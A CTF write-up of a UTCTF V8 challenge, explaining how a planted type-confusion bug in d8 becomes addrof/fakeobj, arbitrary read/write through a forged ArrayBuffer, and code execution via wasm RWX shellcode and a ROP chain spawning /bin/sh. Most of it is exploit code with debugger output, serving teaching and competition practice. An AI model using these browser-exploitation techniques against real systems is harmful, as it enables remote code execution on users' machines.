import Challenge from "@components/Challenge.vue";

UTCTF took place this weekend, and with a weight of 67.21 on CTFtime, there was
no way our team could miss this CTF. However, the challenges weren't really that
great or interesting, apart from a V8 chall (which I'm sure to pro V8 people is
probably really boring, but not having done V8 before, I found it quite fun).
Here's my writeup for the challenge!

Last year, your internship at E-Corp (Evil Corp) ended with a working router RCE
exploit. Leadership was very impressed. As a result, we chose to extend a return
offer. We used your exploit to get a MiTM position on routers around the world.
Now, we want to be able to use that MiTM position to exploit browsers to further
our world domination plans! This summer, you will need to exploit Chrome!

One of our vulnerability researchers has discovered a new type confusion bug in
Chrome. It turns out, a type confusion can be evoked by calling .confuse() on a
PACKED_DOUBLE_ELEMENTS or PACKED_ELEMENTS array. The attached poc.js illustrates
an example. You can run it with ./d8 ./poc.js. Once you have an RCE exploit, you
will find a file with the flag in the current directory. Good luck and have fun!

```

The primitive given to us is straightforward: type confusion between
`PACKED_ELEMENTS` and `PACKED_DOUBLE_ELEMENTS`. To figure out the difference
between the two, let's look at how the V8 engine represents different types of
arrays.

# Arrays in JavaScript

> Just a side note, most pointers in recent versions of V8 are compressed, which
> means that only the lower half of a pointer is stored, while the upper half is
> an ASLR constant for all V8 objects. As a result, most pointers are 32-bit
> even though they actually address 64-bit memory.

In the V8 engine, objects are usually allocated on the V8 heap, which is part of
a separate region called the sandbox. Each object on the V8 heap has a Map
pointer which indicates its type, so that the engine knows how to
dereference/read the values on the object. For an array, this is the memory
layout:

```
0x00: Map (PACKED_ELEMENTS, PACKED_DOUBLE_ELEMENTS etc)
0x04: properties (pointer to FixedArray)
0x08: elements (pointer to FixedArray or FixedDoubleArray)
0x0c: length
```

The actual contents of the array are stored in the `elements` pointer at `+0x8`.
This is the layout for a `FixedArray`:

```
0x00: Map (FIXED_ARRAY_TYPE, FIXED_DOUBLE_ARRAY_TYPE etc)
0x04: length
0x08: arr[0]
0x0c: arr[1]
0x10: ...
```

When an array is indexed, the engine will first check the Map of the object. If
it's one of the array types, it will check the `length` field to prevent OOB
access, then get the value at the corresponding index in the `elements` array.
Depending on the type of Map on the parent object, the final value returned to
the user will be different, as besides integers and floats, all other objects
are referenced by pointers. Integers and floats are stored using their actual
values.

> Because of pointer tagging, integers are actually stored by a
> value twice the actual value, but that's not super important for the exploit.
> I'll talk more about pointer tagging later!

# Upgrading the primitive

On calling `.confuse()`, the Map of the parent object is changed. This changes
how the `elements` store is interpreted, as mentioned earlier.

Since we can swap between regular arrays and float arrays, we have both our
`addrof` and `fakeobj` primitive already. For `addrof`, we can change a
`PACKED_ELEMENTS` type to `PACKED_DOUBLE_ELEMENTS` and read the pointers
directly. For `fakeobj`, we can change `PACKED_DOUBLE_ELEMENTS` to
`PACKED_ELEMENTS` on an array with pointers to our fake objects.

> In V8 exploitation, `addrof` and `fakeobj` are 2 primitives that we usually
> need to get in the V8 sandbox before we can upgrade to arbitrary r/w.

## `addrof`

Let's implement `addrof` first, then we can do the `fakeobj` with the leak we
have.

```js
// helper functions
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function fto64i(val) {
  f64_buf[0] = val;
  return Number(BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n))
}

function fto32i(val) {
  f64_buf[0] = val
  return Number(u64_buf[0])
}

function pack(v0, v1) {
  u64_buf[0] = v0
  u64_buf[1] = v1
  return f64_buf[0]
}

function itof(val) {
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

let arr1 = [{}, {}]
arr1.confuse();
leak = fto32i(arr1[0])
console.log("[*] leak: 0x" + leak.toString(16))
```

```
[*] leak: 0x42e39
```

Here, we can see our leak! The reason why it's pointing to a seemingly unaligned
address is because of pointer tagging as mentioned earlier. To differentiate
between integers and pointers, the V8 engine sets the first bit of pointers to
1, and stores integers as twice their actual value. Thus, if we see any
pointers, we should always subtract 1 before using GDB to view the memory. We
don't need to do this for the `job` command in GDB though.

Since the address that we leaked was that of an
object, we know it's in the V8 heap and probably a constant offset from `arr1`
and any other arrays we define later. Let's test this out with our prospective
`fakeobj`, which we'll create with a float array too.

```js
let fakeobj = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7]
;%DebugPrint(fakeobj)
```


```
[*] leak: 0x42e39
DebugPrint: 0x270200042f15: [JSArray]
 - map: 0x2702001cb86d <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2702001cb1c5 <JSArray[0]>
 - elements: 0x270200042ed5 <FixedDoubleArray[7]> [PACKED_DOUBLE_ELEMENTS]
 - length: 7
 - properties: 0x270200000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x270200000d99: [String] in ReadOnlySpace: #length: 0x270200025fed <AccessorInfo name= 0x270200000d99 <String[6]: #length>, data= 0x270200000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x270200042ed5 <FixedDoubleArray[7]> {
           0: 1.1
           1: 2.2
           2: 3.3
           3: 4.4
           4: 5.5
           5: 6.6
           6: 7.7
 }
...
```

Yup, both pointers are in the `0x42xxx` region. Actually, these addresses don't
change at all because of pointer compression, so we don't technically need the
`addrof` primitive anymore. Well....

```js
let arr0 = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7]
fakeobj_addr = leak - 0x58
console.log("[*] fakeobj address: 0x" + fakeobj_addr.toString(16))

console.log("[*] prepare arr2 to dereference the fake object")
arr2[0] = itof(BigInt(fakeobj_addr))
arr2.confuse()
```

## `fakeobj` to arb read/write

Now, we need to find a target object that we want to forge, which should upgrade
our primitive to arb r/w. The most commonly-used object is `ArrayBuffer{:js}`, because
in non-sandboxed mode, it has a 64-bit unsandboxed pointer allocated on the
binary's actual heap. This is one of the easiest ways to escape the V8 sandbox
and start writing stuff to get our RCE. To create such a buffer and do
read/write operations on it:

```js
let arraybuf = new ArrayBuffer(8)
let dataview = new DataView(arraybuf)
```

Let's inspect the memory layout of the `ArrayBuffer{:js}`:

```js
let a = new ArrayBuffer(8)
;%DebugPrint(a)
```

```ansi
DebugPrint: 0x270200042f89: [JSArrayBuffer]
 - map: 0x2702001c87b9 <Map[56](HOLEY_ELEMENTS)> [FastProperties]

 - properties: 0x270200000725 <FixedArray[0]>
 - All own properties (excluding elements): {}

[34m0x270200042fb8[0m: 0x00000069      0x00000002
```

From this example `ArrayBuffer`, we can see that there are quite a few fields
belonging to the struct. Of greatest interest is the 64-bit heap pointer, which
we can use for the arbitrary read/write. As for the rest of the fields, let's
just copy them into the fake object.

```js
arr0[0] = pack(JS_ARRAY_BUFFER_TYPE, 0x725)
arr0[1] = pack(0x725, 0x0)
arr0[2] = pack(0x69, 0x1000)
arr0[3] = pack(0x0, 0x1000)
arr0[4] = pack(0x0, Number(BigInt(leak) & 0xffffffffn))
arr0[5] = pack(Number(BigInt(leak) >> 32n), 0x80040)
arr0[6] = pack(0x69, 0x2)
let dataview = new DataView(arr2[0])
leak = dataview.getBigUint64(0, true) // or setBigUint64
```

This fake object should allow us to read/write using the get/set methods. Now we
just need a target to get RCE.

## RCE

There are usually a few targets that we can use after getting arbitrary write.

1. wasm rwx page
2. JIT rwx page
3. ROP (through `__free_hook`, `exit_funcs`, saved rip etc)

I tried the wasm method, which worked locally (even in the provided Docker) but
not on remote for some reason. In the end, I found a stack and pie leak and
hence managed to do ROP.

### wasm RWX technique

When creating a `WebAssembly.Instance{:js}`, the V8 engine will allocate an rwx
page and compile the WebAssembly into actual instructions to be executed. The
idea is that the page is left as rwx, and hence if we can leak the address of
this page, we can write shellcode to it, then call the function to get a shell.

```js
let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
let wasm_mod = new WebAssembly.Module(wasm_code)
let wasm_instance = new WebAssembly.Instance(wasm_mod)
let f = wasm_instance.exports.main
;%DebugPrint(wasm_instance)
```

There are quite a few fields in the Instance object, but the one we're
interested in is the `trusted_data` field at `+0xc`. This is a pointer to
another object that holds the actual pointer to our rwx page, as seen below.

```

To get to this, we need to use our `addrof` primitive on both the wasm instance
and the `trusted_data` object, as the addresses of these objects do change across
runs.

> The address of the `trusted_data` object is actually dependent on the length

This snippet will perform the required leaks.

```js
arr1[0] = wasm_instance
let wasm_instance_addr = fto32i(arr1[0])
console.log("[*] wasm instance addr: 0x" + wasm_instance_addr.toString(16))

console.log("[*] get page addr")
arr0[0] = pack(PACKED_DOUBLE_ELEMENTS, 0x725)
arr0[1] = pack(wasm_instance_addr + 0xc - 0x8, 0x4)
let trusted_data = fto32i(arr2[0][0])
console.log("[*] trusted_data addr: 0x" + trusted_data.toString(16))
arr0[0] = pack(PACKED_DOUBLE_ELEMENTS, 0x725)
arr0[1] = pack(trusted_data + 0x30 - 0x8, 0x4)
let page_addr = fto64i(arr2[0][0])
console.log("[*] rwx page addr: 0x" + page_addr.toString(16))
```

Finally, all that's left is to write our shellcode to the rwx page and call the
function we created. As mentioned earlier, we can use a fake `ArrayBuffer`
object for this write primitive.

```js
console.log("[*] prepare array buffer")
arr0[0] = pack(JS_ARRAY_BUFFER_TYPE, 0x725)
arr0[1] = pack(0x725, 0x0)
arr0[2] = pack(0x69, 0x1000)
arr0[3] = pack(0x0, 0x1000)
arr0[4] = pack(0x0, Number(BigInt(page_addr) & 0xffffffffn))
arr0[5] = pack(Number(BigInt(page_addr) >> 32n), 0x80040)
arr0[6] = pack(0x69, 0x2)

console.log("[*] create dataview and write shellcode to rwx page")
// https://shell-storm.org/shellcode/files/shellcode-806.html
// \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
var shellcode = Array(0x4).fill(0x90909090)
shellcode = shellcode.concat([0x31c048bb,0xd19d9691,0xd08c97ff,0x48f7db53,0x545f9952,0x57545eb0,0x3b0f0500])
let dataview = new DataView(arr2[0])
for (let i = 0; i < shellcode.length; i++) {
  console.log(dataview.getUint32(4 * i).toString(16))
	dataview.setUint32(4 * i, shellcode[i], false)
}

console.log("[*] pop shell")
f()

This works fine on local, but for some reason it didn't work on remote. There
were a few people complaining in the Discord, but we were told to try another
method. I'm very sure that the leaks are correct because I can read from the
page, and the instructions tally with what I see on local as well. So the only
other possible explanation is that the rwx page became w^x for some reason.
After waiting a while for the admin to verify my solve, I became pretty sleepy
and went to bed.

### ROP via stack leak

In the morning, I woke up to a closed ticket. Realizing there wasn't an easy way
out, I decided to do a one gadget/ROP either through House of Apple or stack rip
overwrite respectively. The plan was to leak something via the heap pointer that
we first saw in the `ArrayBuffer` object. Most likely, there would be some libc
addresses I could leak from unsorted chunks; I can then attack the file structs
from there.

We can use the arbitrary read to leak the heap pointer from the `ArrayBuffer`
directly.

```js
console.log("[*] leak heap pointer in arraybuf")
arr0[0] = pack(PACKED_DOUBLE_ELEMENTS, 0x725)
arr0[1] = pack(arraybuf_addr + 0x1c, 0x8)
heap_ptr = fto64i(arr2[0][0])
console.log("[*] heap pointer: 0x" + heap_ptr.toString(16))
```

Wow, both a stack leak and a libc leak! Even better, we have a convenient pie
leak at the stack leak should we choose to use it. I soon realized that the
libc leak from the `[35mmain_arena[0m{:ansi}` address was pretty unreliable
as the chunks kept updating every time I do something in the script. The stack
leak, however, is actually part of the chunk that we leaked, and so is much more
reliable. Let's leak stack and pie via the `fakeobj` primitive.

```js
stack_leak = heap_ptr + 0x48
console.log("[*] get stack leak from heap")
console.log("[*] reading from 0x" + stack_leak.toString(16))
arr0[0] = pack(JS_ARRAY_BUFFER_TYPE, 0x725)
arr0[1] = pack(0x725, 0x0)
arr0[2] = pack(0x69, 0x1000)
arr0[3] = pack(0x0, 0x1000)
arr0[4] = pack(0x0, Number(BigInt(stack_leak) & 0xffffffffn))
arr0[5] = pack(Number(BigInt(stack_leak) >> 32n), 0x80040)
arr0[6] = pack(0x69, 0x2)
let dataview = new DataView(arr2[0])
stack_leak = dataview.getBigUint64(0, true)
console.log("[*] stack leak: 0x" + stack_leak.toString(16))

console.log("[*] get pie leak from stack")
console.log("[*] reading from 0x" + stack_leak.toString(16))
arr0[4] = pack(0x0, Number(stack_leak & 0xffffffffn))
arr0[5] = pack(Number(stack_leak >> 32n), 0x80040)
pie_base = dataview.getBigUint64(0, true) - 0x288c578n
console.log("[*] pie base: 0x" + pie_base.toString(16))
```

Now, a candidate stack target I had in mind was the saved rip at
`__libc_start_call_main{:c}`. I tested by overwriting the value manually in GDB in both
`--shell` and regular mode, and in both cases the program tries to return to my
overwritten address, so this is definitely a viable write.

Luckily, because of the vast number of gadgets in `d8`, the ROP part was very
simple - just pop all the required registers, syscall, and win!

```js
// libc_start_call_main: -0x1b98 from bottom of stack, 0x1b8 from stack leak
let libc_start_call_main = stack_leak + 0x1b8n
let start_of_write = libc_start_call_main - 0x8n // space for binsh
console.log("[*] write rop chain")
console.log("[*] rop chain at libc_start_call_main: 0x" + libc_start_call_main.toString(16))
arr0[4] = pack(0x0, Number(start_of_write & 0xffffffffn))
arr0[5] = pack(Number(start_of_write >> 32n), 0x80040)

let syscall = pie_base + 0x11976bcn
let pop_rax = pie_base + 0x1195e45n
let pop_rdi = pie_base + 0x133d0a1n
let pop_rsi = pie_base + 0x1455417n
let pop_rdx = pie_base + 0x12949e2n

let binsh_string = 0x68732f6e69622fn
let binsh_addr = start_of_write
let rop_chain = [
  binsh_string,
  pop_rdi, binsh_addr,
  pop_rsi, 0x0n,
  pop_rdx, 0x0n,
  pop_rax, 59n,
  syscall
]

let stack_pos = 0
for (let i = 0; i < rop_chain.length; i++) {
  dataview.setBigUint64(i*8, rop_chain[i], true)
}
```

After overwriting the saved rip, exiting the `d8` binary will trigger the RCE.

This was my very first V8 challenge and I'm quite happy to have solved it during
the CTF. I learnt a lot about V8 internals, and will probably correct any wrong
info in this writeup when I get better at V8. Excited to try solving more V8
challs in the near future!
